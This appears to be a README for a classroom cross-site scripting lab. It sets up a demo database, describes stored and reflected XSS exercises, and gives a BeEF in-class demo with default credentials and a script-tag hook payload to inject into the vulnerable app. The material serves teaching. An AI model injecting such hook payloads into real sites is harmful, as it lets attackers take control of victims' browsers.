# XSS Practice Setup

## Self Practice Exercises

```sql
create database xssdemo;

CREATE TABLE data_store (
  id INT NOT NULL AUTO_INCREMENT,
  value VARCHAR(256) DEFAULT NULL,
  PRIMARY KEY (id)
);
```

### Exercises

1. Exercise 1
Exercise 1 consist of 2 php files, namely: xss-1a.php and xss-1b.php. This is a practice for stored XSS attack. xss-1a.php will save the user input into the database. xss-1b.php will display the results of the input.

2. Exercise 2
Exercise 2 consist of 2 php files, namely: xss-2a.php and xss-2b.php. This is a practice for reflected XSS attack. The difference lies in the removal of response header for XSS protection flag. This flag will tell the browser to ignore or disable the in-bulit XSS protection mechanism.

## In Class Demo - Beef

1. Start BeEF and login using their default credentials (beef:beef). Visit: http://127.0.0.1:3000/ui/panel

2. Inject the hook script payload into the vulnerable web application. 
```js
<script src="http://127.0.0.1:3000/hook.js"></script>
```

_Some of the payloads may not work because the browser is no longer vulnerable to that particular payload._